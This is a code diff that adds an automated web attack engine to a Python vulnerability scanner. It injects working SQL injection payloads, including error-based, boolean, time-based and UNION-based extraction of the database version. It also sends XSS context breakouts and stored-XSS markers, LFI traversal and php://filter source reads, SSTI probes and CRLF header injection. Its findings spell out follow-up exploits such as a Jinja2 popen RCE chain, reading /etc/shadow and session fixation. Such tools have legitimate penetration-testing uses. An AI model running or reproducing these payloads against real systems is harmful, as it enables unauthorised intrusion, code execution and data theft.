+        quote = "" if profile.get("type") == "int" else "'"
+        probe = self._send_test(endpoint, pname, f"{pval}{quote}")
+        if not probe or not probe.text:
+            return findings
+
+        # Check for ANY SQL error indicator
+        sql_error_found = False
+        matched_indicator = None
+        for ind in self.SQLI_INDICATORS:
+            if ind.search(probe.text[:8000]) and not ind.search(baseline_text):
+                sql_error_found = True
+                matched_indicator = ind
+                break
+
+        # Also check: did the response change significantly?
+        probe_diff = self._response_diff(baseline_text, probe.text)
+        response_changed = not probe_diff["similar"]
+
+        if not sql_error_found and not response_changed and depth < 4:
+            return findings  # Shallow test: nothing interesting, move on
+
+        # ── Stage 2: Error-based (if error detected or medium+ depth) ──
+        if sql_error_found or depth >= 4:
+            if profile.get("type") == "int":
+                payloads = [
+                    f"{pval} OR 1=1-- -", f"{pval} AND 1=2-- -",
+                    f"{pval} UNION SELECT NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+                    f"{pval} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                ]
+            else:
+                payloads = [
+                    f"{pval}' OR '1'='1'-- -", f"{pval}' AND '1'='2'-- -",
+                    f"{pval}' UNION SELECT NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+                    f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                ]
+
+            # Add mutations if deep
+            all_payloads = list(payloads)
+            if depth >= 7:
+                for bp in payloads[:3]:
+                    all_payloads.extend(self._mutate_sqli(bp))
+
+            for payload in all_payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text:
+                    continue
+
+                for ind in self.SQLI_INDICATORS:
+                    if ind.search(resp.text[:8000]) and not ind.search(baseline_text):
+                        # Confirmed error-based SQLi — try to extract data
+                        extracted = self._sqli_extract(endpoint, pname, pval, profile)
+                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                        detail = f"SQL error from: {payload[:40]}"
+                        if extracted:
+                            detail += f". VERIFIED: {extracted}"
+
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"SQL injection via '{pname}' at {path}",
+                            "detail": detail,
+                            "evidence": f"param: {pname}, payload: {payload[:40]}, "
+                                        f"indicator: {ind.pattern[:40]}"
+                                        + (f", {extracted}" if extracted else ""),
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "sqli", "parameter": pname, "path": path,
+                                "method": f"Error-based SQLi at {path} via '{pname}'."
+                                          + (f" {extracted}" if extracted else ""),
+                                "risk": "Full database access, data exfiltration, potential RCE",
+                            },
+                        })
+                        return findings
+
+        # ── Stage 3: Blind boolean (if response changed or medium+ depth) ──
+        if (response_changed or depth >= 4) and not findings:
+            if profile.get("type") == "int":
+                true_val, false_val = f"{pval} AND 1=1", f"{pval} AND 1=2"
+            else:
+                true_val = f"{pval}' AND '1'='1"
+                false_val = f"{pval}' AND '1'='2"
+
+            true_resp = self._send_test(endpoint, pname, true_val)
+            false_resp = self._send_test(endpoint, pname, false_val)
+            if true_resp and false_resp and true_resp.text and false_resp.text:
+                true_diff = self._response_diff(baseline_text, true_resp.text)
+                false_diff = self._response_diff(baseline_text, false_resp.text)
+
+                if true_diff["similar"] and not false_diff["similar"]:
+                    test_url = f"{url}?{pname}={quote(true_val)}" if endpoint.get("method") == "GET" else url
+                    findings.append({
+                        "severity": SEV_CRITICAL,
+                        "title": f"Blind SQLi via '{pname}' at {path}",
+                        "detail": f"Boolean condition changes response. "
+                                  f"true_sim={true_diff['score']}, false_sim={false_diff['score']}",
+                        "evidence": f"param: {pname}, "
+                                    f"true={true_diff['score']}, false={false_diff['score']}",
+                        "exploitable": True, "test_url": test_url,
+                        "exploit_info": {
+                            "type": "sqli", "parameter": pname, "path": path,
+                            "method": f"Blind boolean SQLi via '{pname}'.",
+                            "risk": "Database extraction via boolean inference",
+                        },
+                    })
+                    return findings
+
+        # ── Stage 4: Time-based blind (deep only) ──────────────────────
+        if depth >= 7 and not findings:
+            times = []
+            for _ in range(2):
+                t0 = time.time()
+                self._send_test(endpoint, pname, pval)
+                times.append(time.time() - t0)
+            bt = sum(times) / len(times)
+            bv = max(abs(t - bt) for t in times)
+            threshold = bt + max(2.0, bv * 3)
+
+            if profile.get("type") == "int":
+                tp = [(f"{pval} AND SLEEP(3)-- -", "SLEEP"),
+                      (f"{pval} AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
+                      (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
+            else:
+                tp = [(f"{pval}' AND SLEEP(3)-- -", "SLEEP"),
+                      (f"{pval}' AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
+                      (f"{pval}'; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
+
+            for payload, desc in tp:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+                t0 = time.time()
+                self._send_test(endpoint, pname, payload)
+                e1 = time.time() - t0
+                if e1 > threshold and e1 > bt + 2.0:
+                    t0 = time.time()
+                    self._send_test(endpoint, pname, payload)
+                    e2 = time.time() - t0
+                    if e2 > threshold and e2 > bt + 2.0:
+                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"Time-based blind SQLi via '{pname}' at {path}",
+                            "detail": f"{desc}: baseline={bt:.1f}s, test={e1:.1f}s/{e2:.1f}s",
+                            "evidence": f"param: {pname}, {desc}, {e1:.1f}s/{e2:.1f}s vs {bt:.1f}s",
+                            "exploitable": True, "test_url": test_url,
+                            "exploit_info": {
+                                "type": "sqli", "parameter": pname, "path": path,
+                                "method": f"Time-based blind SQLi via {desc}.",
+                                "risk": "Database extraction via time-based inference",
+                            },
+                        })
+                        return findings
+
+        return findings
+
+    def _sqli_extract(self, endpoint: dict, pname: str, pval: str,
+                      profile: dict) -> str:
+        """Try to extract DB version via UNION SELECT after confirming SQLi."""
+        q = "" if profile.get("type") == "int" else "'"
+        for cols in range(1, 8):
+            nulls = ",".join(["NULL"] * cols)
+            for pos in range(cols):
+                parts = ["NULL"] * cols
+                parts[pos] = "CONCAT(0x67733a,version(),0x3a7367)"
+                union = ",".join(parts)
+                payload = f"{pval}{q} UNION SELECT {union}-- -"
+                resp = self._send_test(endpoint, pname, payload)
+                if resp and resp.text:
+                    m = re.search(r"gs:(.*?):sg", resp.text)
+                    if m:
+                        return f"DB version: {m.group(1)}"
+        return ""
+
+    def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
+        """Test endpoint for SQLi using the adaptive attack loop."""
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        if self._session.is_domain_blocked(domain):
+            return []
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:2]
+
+        skip_names = {"csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
+                      "__requestverificationtoken", "csrf_token", "authenticity_token"}
+        findings = []
+
+        for param_info in testable[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            pname = param_info["name"]
+            if pname.lower() in skip_names:
+                continue
+            pval = param_info.get("value", "") or "1"
+
+            profile = self._profile_param(endpoint, pname)
+            score = self._score_param(profile)
+
+            # Depth determines how many techniques to try
+            if score >= 7:
+                depth = 10   # deep: all techniques + mutations + time-based
+            elif score >= 4:
+                depth = 6    # medium: error-based + blind boolean
+            else:
+                depth = 2    # shallow: quick probe only
+
+            result = self._attack_sqli(endpoint, pname, pval, profile, depth)
+            if result:
+                findings.extend(result)
+                return findings
+
+        return findings
+
+    def _test_endpoint_xss(self, endpoint: dict) -> List[dict]:
+        """Test for reflected XSS across multiple injection contexts."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:2]
+
+        for param_info in testable[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            pname = param_info["name"]
+            cid = secrets.token_hex(4)
+
+            # Profile the parameter to understand reflection context
+            profile = self._profile_param(endpoint, pname)
+
+            if not profile["reflected"]:
+                # Input not reflected at all — XSS unlikely, skip quickly
+                # but try one probe to double-check
+                probe_resp = self._send_test(endpoint, pname, f"<gs{cid}>")
+                if not probe_resp or f"<gs{cid}>" not in (probe_resp.text or ""):
+                    continue
+
+            # Build context-specific payloads based on WHERE the reflection occurs
+            ctx = profile.get("reflection_context", "text")
+            all_payloads = []
+
+            if ctx == "attribute":
+                # Reflected inside an HTML attribute — break out first
+                all_payloads = [
+                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute breakout + event"),
+                    (f"' onfocus='gs{cid}' autofocus='", f"gs{cid}", "single-quote attr breakout"),
+                    (f'"><script>gs{cid}</script>', f"gs{cid}", "attribute breakout + script"),
+                    (f'" onmouseover="gs{cid}"', f"gs{cid}", "attribute + mouseover"),
+                ]
+            elif ctx == "script":
+                # Reflected inside a <script> block — close string/expression
+                all_payloads = [
+                    (f"';gs{cid};//", f"gs{cid}", "JS string breakout (single)"),
+                    (f'";gs{cid};//', f"gs{cid}", "JS string breakout (double)"),
+                    (f"</script><script>gs{cid}</script>", f"gs{cid}", "script tag breakout"),
+                    (f"-gs{cid}-", f"-gs{cid}-", "inline JS expression"),
+                ]
+            elif ctx == "tag":
+                # Reflected inside an HTML tag (between < and >)
+                all_payloads = [
+                    (f' onfocus="gs{cid}" autofocus ', f"gs{cid}", "in-tag event injection"),
+                    (f'><script>gs{cid}</script>', f"gs{cid}", "tag close + script"),
+                    (f' onmouseover="gs{cid}" ', f"gs{cid}", "in-tag mouseover"),
+                ]
+            else:
+                # Text context or unknown — full set
+                all_payloads = [
+                    (f"<gs{cid}>", f"<gs{cid}>", "HTML tag injection"),
+                    (f"<script>gs{cid}</script>", f"<script>gs{cid}</script>", "script injection"),
+                    (f'<img src=x onerror="gs{cid}">', f"gs{cid}", "event handler"),
+                    (f'<svg onload="gs{cid}">', f"gs{cid}", "SVG onload"),
+                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute injection"),
+                    (f"javascript:gs{cid}//", f"javascript:gs{cid}", "javascript: URI"),
+                ]
+
+            # Add mutation variants for the first few payloads
+            payloads = list(all_payloads)
+            for bp, _, _ in all_payloads[:2]:
+                for mut in self._mutate_xss(bp):
+                    if mut != bp:
+                        # Re-derive check string from mutation
+                        payloads.append((mut, f"gs{cid}", f"mutated: {mut[:20]}"))
+
+            for payload, check_str, desc in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text or resp.status_code in (403, 429, 503):
+                    continue
+
+                if check_str in resp.text:
+                    # Confirm it's in an executable context
+                    idx = resp.text.find(check_str)
+                    context_before = resp.text[max(0, idx-200):idx].lower()
+                    # Skip if inside HTML comment or <textarea>/<pre>
+                    if "<!--" in context_before and "-->" not in context_before:
+                        continue
+                    in_safe = any(f"<{t}" in context_before and f"</{t}" not in context_before
+                                 for t in ("textarea", "pre", "code", "xmp"))
+                    if in_safe:
+                        continue
+
+                    test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Reflected XSS via '{pname}' at {path}",
+                        "detail": f"Payload reflected unescaped in {desc} context.",
+                        "evidence": f"param: {pname}, context: {desc}, "
+                                    f"payload reflected at position {idx}",
+                        "exploitable": True,
+                        "test_url": test_url,
+                        "exploit_info": {
+                            "type": "xss",
+                            "parameter": pname,
+                            "path": path,
+                            "method": f"Inject via '{pname}' at {path}. Context: {desc}. "
+                                      f"Payload: <script>alert(document.cookie)</script>",
+                            "risk": "Session theft, credential capture, phishing",
+                        },
+                    })
+                    return findings
+        return findings
+
+    def _test_endpoint_lfi(self, endpoint: dict) -> List[dict]:
+        """Test for Local File Inclusion / path traversal on discovered endpoints."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        # Only test params that look like they accept file/path input
+        file_params = [p for p in endpoint["params"]
+                       if p["name"].lower() in ("page", "file", "include", "path",
+                                                 "template", "doc", "view", "lang",
+                                                 "dir", "folder", "load", "read",
+                                                 "content", "module", "action")
+                       and not p.get("hidden")]
+        if not file_params:
+            return findings
+
+        passwd_indicators = [
+            re.compile(r"root:[x*]:0:0:"),
+            re.compile(r"daemon:.*:/usr/sbin"),
+            re.compile(r"www-data:.*:/var/www"),
+            re.compile(r"\[boot loader\]", re.I),  # Windows boot.ini
+        ]
+
+        payloads = [
+            "../../../etc/passwd",
+            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+            "....//....//....//etc/passwd",
+            "/etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini",
+            "php://filter/convert.base64-encode/resource=index",
+            "php://filter/convert.base64-encode/resource=../config",
+        ]
+
+        for param_info in file_params[:2]:
+            for payload in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+                resp = self._send_test(endpoint, param_info["name"], payload)
+                if not resp or not resp.text:
+                    continue
+                for ind in passwd_indicators:
+                    if ind.search(resp.text[:5000]):
+                        test_url = f"{url}?{param_info['name']}={quote(payload)}" if endpoint["method"] == "GET" else url
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"LFI via '{param_info['name']}' at {path}",
+                            "detail": "Arbitrary local files readable through web server.",
+                            "evidence": f"param: {param_info['name']}, payload: {payload[:40]}",
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "lfi",
+                                "parameter": param_info["name"],
+                                "path": path,
+                                "method": f"LFI via '{param_info['name']}' at {path}. "
+                                          "Read /etc/shadow, config files, source code.",
+                                "risk": "Full filesystem read, credential theft, potential RCE",
+                            },
+                        })
+                        return findings
+                # Check for base64-encoded PHP source (php:// wrapper)
+                if "php://" in payload and resp.text:
+                    import base64 as _b64
+                    try:
+                        for chunk in re.findall(r'[A-Za-z0-9+/=]{40,}', resp.text[:5000]):
+                            decoded = _b64.b64decode(chunk).decode("utf-8", errors="ignore")
+                            if "<?php" in decoded or "<?=" in decoded:
+                                findings.append({
+                                    "severity": SEV_CRITICAL,
+                                    "title": f"PHP source disclosure via '{param_info['name']}' at {path}",
+                                    "detail": "PHP filter wrapper returns base64-encoded source code.",
+                                    "evidence": f"param: {param_info['name']}, decoded PHP source found",
+                                    "exploitable": True,
+                                    "test_url": f"{url}?{param_info['name']}={quote(payload)}",
+                                    "exploit_info": {
+                                        "type": "lfi",
+                                        "parameter": param_info["name"],
+                                        "path": path,
+                                        "method": "PHP filter wrapper to read source code. "
+                                                  "Try: php://filter/convert.base64-encode/resource=config",
+                                        "risk": "Source code disclosure, credential extraction",
+                                    },
+                                })
+                                return findings
+                    except Exception:
+                        pass
+        return findings
+
+    def _test_endpoint_ssti(self, endpoint: dict) -> List[dict]:
+        """Test for Server-Side Template Injection.
+
+        SSTI allows arbitrary code execution when user input is rendered
+        through a template engine (Jinja2, Twig, Freemarker, etc.).
+        """
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:1]
+
+        # Use math expressions that produce known outputs
+        marker_a, marker_b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
+        expected = str(marker_a * marker_b)
+
+        payloads = [
+            (f"{{{{{marker_a}*{marker_b}}}}}", "Jinja2/Twig"),
+            (f"${{{marker_a}*{marker_b}}}", "Freemarker/Velocity/EL"),
+            (f"<%= {marker_a}*{marker_b} %>", "ERB/JSP"),
+            (f"#{{{marker_a}*{marker_b}}}", "Ruby/Pebble"),
+            (f"${{={marker_a}*{marker_b}}}", "Smarty"),
+        ]
+
+        for param_info in testable[:2]:
+            pname = param_info["name"]
+            for payload, engine in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text:
+                    continue
+
+                # Check if the math was evaluated (the computed result appears)
+                if expected in resp.text:
+                    # Verify it's not just the raw expression being echoed
+                    raw_expr = f"{marker_a}*{marker_b}"
+                    if raw_expr not in resp.text:
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"SSTI ({engine}) via '{pname}' at {path}",
+                            "detail": f"Template expression {{{{{marker_a}*{marker_b}}}}} "
+                                      f"evaluated to {expected}. Server-side code execution confirmed.",
+                            "evidence": f"param: {pname}, input: {payload[:30]}, "
+                                        f"output contains: {expected}",
+                            "exploitable": True,
+                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
+                            "exploit_info": {
+                                "type": "ssti",
+                                "parameter": pname,
+                                "path": path,
+                                "method": f"SSTI via '{pname}' at {path}. Engine: {engine}. "
+                                          "For RCE (Jinja2): "
+                                          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                                "risk": "Remote code execution, full server compromise",
+                            },
+                        })
+                        return findings
+
+                # Check for template engine error messages
+                for ind in self.SSTI_INDICATORS:
+                    if ind.search(resp.text[:5000]):
+                        findings.append({
+                            "severity": SEV_HIGH,
+                            "title": f"Possible SSTI ({engine}) via '{pname}' at {path}",
+                            "detail": "Template engine error triggered by expression injection.",
+                            "evidence": f"param: {pname}, engine indicator: {ind.pattern[:30]}",
+                            "exploitable": True,
+                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
+                            "exploit_info": {
+                                "type": "ssti",
+                                "parameter": pname,
+                                "path": path,
+                                "method": f"SSTI indicators from {engine}. "
+                                          "Confirm with: {{7*7}} → look for 49",
+                                "risk": "Potential remote code execution",
+                            },
+                        })
+                        return findings
+        return findings
+
+    def _test_endpoint_crlf(self, endpoint: dict) -> List[dict]:
+        """Test for CRLF injection / HTTP header injection."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            return findings
+
+        crlf_marker = f"gs{secrets.token_hex(4)}"
+
+        payloads = [
+            (f"%0d%0aX-Injected: {crlf_marker}", "URL-encoded CRLF"),
+            (f"%0aX-Injected: {crlf_marker}", "LF only"),
+            (f"\r\nX-Injected: {crlf_marker}", "raw CRLF"),
+        ]
+
+        for param_info in testable[:2]:
+            pname = param_info["name"]
+            for payload, desc in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+
+                if endpoint["method"] == "GET":
+                    test_url = f"{url}?{pname}={payload}"
+                    try:
+                        self._session._delay_for_domain(domain)
+                        resp = self._session._session.get(
+                            test_url, timeout=REQUEST_TIMEOUT,
+                            proxies=self._session._proxy, headers=_pick_profile(),
+                            allow_redirects=False
+                        )
+                    except Exception:
+                        continue
+                else:
+                    resp = self._send_test(endpoint, pname, payload)
+
+                if resp is None:
+                    continue
+
+                # Check if our header was injected into the response headers
+                injected = resp.headers.get("X-Injected", "")
+                if crlf_marker in injected:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"CRLF injection via '{pname}' at {path}",
+                        "detail": "HTTP header injection confirmed. Attacker can inject "
+                                  "arbitrary headers (Set-Cookie, Location, etc.).",
+                        "evidence": f"param: {pname}, {desc}, "
+                                    f"X-Injected: {crlf_marker} appeared in response headers",
+                        "exploitable": True,
+                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
+                        "exploit_info": {
+                            "type": "crlf",
+                            "parameter": pname,
+                            "path": path,
+                            "method": f"CRLF injection via '{pname}'. "
+                                      "Inject Set-Cookie to fixate sessions, "
+                                      "or Location header for redirect.",
+                            "risk": "Session fixation, cache poisoning, XSS via injected headers",
+                        },
+                    })
+                    return findings
+
+                # Check for header value in response body (some frameworks echo it)
+                if resp.text and f"X-Injected: {crlf_marker}" in resp.text:
+                    findings.append({
+                        "severity": SEV_MEDIUM,
+                        "title": f"Possible CRLF injection via '{pname}' at {path}",
+                        "detail": "CRLF payload reflected in response body.",
+                        "evidence": f"param: {pname}, {desc}, reflected in body",
+                        "exploitable": True,
+                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
+                        "exploit_info": {
+                            "type": "crlf",
+                            "parameter": pname,
+                            "path": path,
+                            "method": "CRLF reflected in body — may indicate header injection.",
+                            "risk": "Header injection, potential XSS",
+                        },
+                    })
+                    return findings
+        return findings
 
     @staticmethod
     def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
@@ -784,6 +2139,12 @@ class VulnScanner:
             headers = {}
         findings = []
 
+        # Extract real params from the page HTML for targeted testing
+        if html:
+            self.extract_params_from_html(html, base_url)
+            if self._page_params:
+                print(f"      found {len(self._page_params)} testable parameters")
+
         # Header checks (instant, no network)
         self._run_check("security headers", self._check_security_headers,
                         (headers,), 0.95, findings)
@@ -795,29 +2156,302 @@ class VulnScanner:
                         (headers,), 0.9, findings)
 
         if depth in ("full", "deep"):
-            # Network checks (can be slow)
             self._run_check("sensitive paths", self._check_sensitive_paths,
                             (base_url,), 0.75, findings)
             self._run_check("HTTP methods", self._check_http_methods,
                             (base_url,), 0.7, findings)
             self._run_check("open redirect", self._check_open_redirect,
                             (base_url,), 0.85, findings)
+            self._run_check("CSRF protection", self._check_csrf,
+                            (html,), 0.8, findings)
+            self._run_check("IDOR indicators", self._check_idor,
+                            (base_url, html), 0.7, findings)
+
+            if depth == "full":
+                self._run_check("SQL injection (quick)", self._check_sqli_indicators,
+                                (base_url,), 0.85, findings)
+                self._run_check("XSS reflection (quick)", self._check_xss_reflection,
+                                (base_url,), 0.85, findings)
 
         if depth == "deep":
-            # Active exploit checks (network-heavy)
-            self._run_check("SQL injection", self._check_sqli_indicators,
-                            (base_url,), 0.9, findings)
-            self._run_check("XSS reflection", self._check_xss_reflection,
-                            (base_url,), 0.9, findings)
-            self._run_check("directory traversal", self._check_directory_traversal,
-                            (base_url,), 0.95, findings)
+            # Infrastructure checks (against base URL)
             self._run_check("SSL/TLS", self._check_ssl_cert,
                             (base_url,), 0.85, findings)
             self._run_check("GraphQL introspection", self._check_graphql_introspection,
                             (base_url,), 0.95, findings)
+            self._run_check("directory traversal", self._check_directory_traversal,
+                            (base_url,), 0.95, findings)
+
+            # Crawl to discover real endpoints with parameters
+            if html:
+                print(f"      crawling for endpoints...", end="", flush=True)
+                try:
+                    discovered = self.crawl_for_endpoints(base_url, html)
+                    print(f" {len(discovered)} endpoint(s)")
+                except Exception as e:
+                    discovered = []
+                    print(f" error: {type(e).__name__}")
+                    integrity_log("intel", f"crawl_error:{type(e).__name__}")
+
+            # ── TWO-PHASE ATTACK ENGINE ──────────────────────────────────
+            # Phase A: Inject tracked payloads into every endpoint
+            # Phase B: Re-crawl the site and search ALL responses for markers
+            #
+            # This catches stored XSS, second-order SQLi, and delayed rendering
+            # that single-endpoint testing completely misses.
+
+            endpoints = self._crawled_urls
+            if not endpoints:
+                endpoints = [{"url": base_url, "params": [{"name": p, "value": "1",
+                              "hidden": False, "type": "text"}
+                              for p in self._get_test_params(["id", "q", "search"])],
+                              "method": "GET", "source": "fallback"}]
+
+            domain = urlparse(base_url).netloc
+            self._session.reset_domain_blocks(domain)
+
+            # ── PHASE A: Inject + immediate analysis ──────────────────
+            injected_markers: Dict[str, dict] = {}
+            revisit_from_injection: Set[str] = set()  # links discovered during injection
+
+            print(f"      Phase A: testing {len(endpoints)} endpoint(s)...")
+            tested = 0
+            for ep in endpoints[:20]:
+                if shutdown_requested():
+                    break
+                if self._session.is_domain_blocked(urlparse(ep["url"]).netloc):
+                    continue
+                tested += 1
+                path = urlparse(ep["url"]).path or "/"
+                param_names = [p["name"] for p in ep["params"] if not p.get("hidden")][:3]
+                params_str = ",".join(param_names) if param_names else "(hidden only)"
+                print(f"        [{tested}] {ep['method']} {path} ({params_str})", end="", flush=True)
+
+                ep_findings = []
+
+                # SQLi (adaptive attack loop)
+                try:
+                    sqli = self._test_endpoint_sqli(ep)
+                    ep_findings.extend(sqli)
+                except Exception as e:
+                    integrity_log("intel", f"sqli_error:{path}:{type(e).__name__}")
+
+                # XSS — inject tracked markers for stored detection
+                try:
+                    xss = self._test_endpoint_xss(ep)
+                    ep_findings.extend(xss)
+                except Exception as e:
+                    integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")
+
+                # Inject stored XSS markers with unique IDs for cross-endpoint tracking
+                for pi in [p for p in ep["params"] if not p.get("hidden")][:2]:
+                    marker_id = f"x{secrets.token_hex(5)}"
+                    stored_payload = f'<img src=x onerror="{marker_id}">'
+                    try:
+                        inject_resp = self._send_test(ep, pi["name"], stored_payload)
+                        injected_markers[marker_id] = {
+                            "type": "stored_xss",
+                            "endpoint": path,
+                            "param": pi["name"],
+                            "payload": stored_payload,
+                            "seen_in": [],
+                        }
+                        # Extract links from the injection response for smart revisiting
+                        if inject_resp and inject_resp.text and HAS_BS4:
+                            try:
+                                _soup = BeautifulSoup(inject_resp.text[:50000], "html.parser")
+                                for _a in _soup.find_all("a", href=True):
+                                    _href = _a.get("href", "")
+                                    if _href and not _href.startswith(("#", "javascript:", "mailto:")):
+                                        _full = urljoin(ep["url"], _href)
+                                        if domain in urlparse(_full).netloc:
+                                            revisit_from_injection.add(_full)
+                            except Exception:
+                                pass
+                    except Exception:
+                        pass
+
+                # SSTI markers
+                ssti_a, ssti_b = secrets.randbelow(90)+10, secrets.randbelow(90)+10
+                ssti_expected = str(ssti_a * ssti_b)
+                ssti_marker = f"t{secrets.token_hex(4)}"
+                for pi in [p for p in ep["params"] if not p.get("hidden")][:1]:
+                    try:
+                        r = self._send_test(ep, pi["name"], f"{{{{{ssti_a}*{ssti_b}}}}}")
+                        if r and r.text and ssti_expected in r.text:
+                            raw = f"{ssti_a}*{ssti_b}"
+                            if raw not in r.text:
+                                ep_findings.append({
+                                    "severity": SEV_CRITICAL,
+                                    "title": f"SSTI via '{pi['name']}' at {path}",
+                                    "detail": f"Template expression evaluated: {ssti_expected}",
+                                    "evidence": f"param: {pi['name']}, {ssti_a}*{ssti_b}={ssti_expected}",
+                                    "exploitable": True,
+                                    "test_url": f"{ep['url']}?{pi['name']}={quote(f'{{{{{ssti_a}*{ssti_b}}}}}')}" if ep["method"] == "GET" else ep["url"],
+                                    "exploit_info": {"type": "ssti", "parameter": pi["name"],
+                                                     "path": path, "method": "SSTI confirmed.",
+                                                     "risk": "Remote code execution"},
+                                })
+                    except Exception:
+                        pass
+
+                # LFI
+                try:
+                    lfi = self._test_endpoint_lfi(ep)
+                    ep_findings.extend(lfi)
+                except Exception as e:
+                    integrity_log("intel", f"lfi_error:{path}:{type(e).__name__}")
+
+                # CRLF
+                try:
+                    crlf = self._test_endpoint_crlf(ep)
+                    ep_findings.extend(crlf)
+                except Exception as e:
+                    integrity_log("intel", f"crlf_error:{path}:{type(e).__name__}")
+
+                if ep_findings:
+                    self._add_confidence(ep_findings, 0.9)
+                    findings.extend(ep_findings)
+                    print(f" -> {len(ep_findings)} FOUND")
+                else:
+                    print(f" -> clean")
+
+            # ── PHASE B: Multi-round revisit with context-aware detection ──
+            if injected_markers:
+                print(f"\n      Phase B: tracking {len(injected_markers)} markers "
+                      f"across {len(revisit_from_injection)} linked pages...")
+                self._session.reset_domain_blocks(domain)
+
+                # Build prioritized revisit list:
+                # 1. Links found IN injection responses (highest priority — the app told us to go here)
+                # 2. All crawled endpoint URLs
+                # 3. Common render pages as fallback
+                revisit_urls: List[str] = []
+                seen_revisit: Set[str] = set()
+
+                for u in revisit_from_injection:
+                    if u not in seen_revisit:
+                        seen_revisit.add(u)
+                        revisit_urls.append(u)
+
+                for ep in endpoints[:20]:
+                    if ep["url"] not in seen_revisit:
+                        seen_revisit.add(ep["url"])
+                        revisit_urls.append(ep["url"])
+
+                for suffix in ["/", "/index.php", "/dashboard", "/admin",
+                               "/comments", "/users", "/search", "/profile",
+                               "/blog", "/posts", "/list", "/home"]:
+                    u = urljoin(base_url, suffix)
+                    if u not in seen_revisit:
+                        seen_revisit.add(u)
+                        revisit_urls.append(u)
+
+                stored_found = 0
+                already_reported: Set[str] = set()
+
+                # Multiple revisit rounds — some payloads only appear after
+                # page refresh, cache clear, or DB commit cycles
+                for revisit_round in range(2):
+                    if shutdown_requested():
+                        break
+                    if revisit_round > 0:
+                        print(f"      Phase B round {revisit_round + 1}...")
+                        time.sleep(2 + secrets.randbelow(3000) / 1000.0)
+
+                    for revisit_url in revisit_urls[:30]:
+                        if shutdown_requested() or self._session.is_domain_blocked(domain):
+                            break
+                        try:
+                            resp = self._session.get(revisit_url, allow_wayback=False)
+                            if not resp or not resp.text:
+                                continue
+
+                            for marker_id, minfo in injected_markers.items():
+                                if marker_id not in resp.text:
+                                    continue
+
+                                revisit_path = urlparse(revisit_url).path or "/"
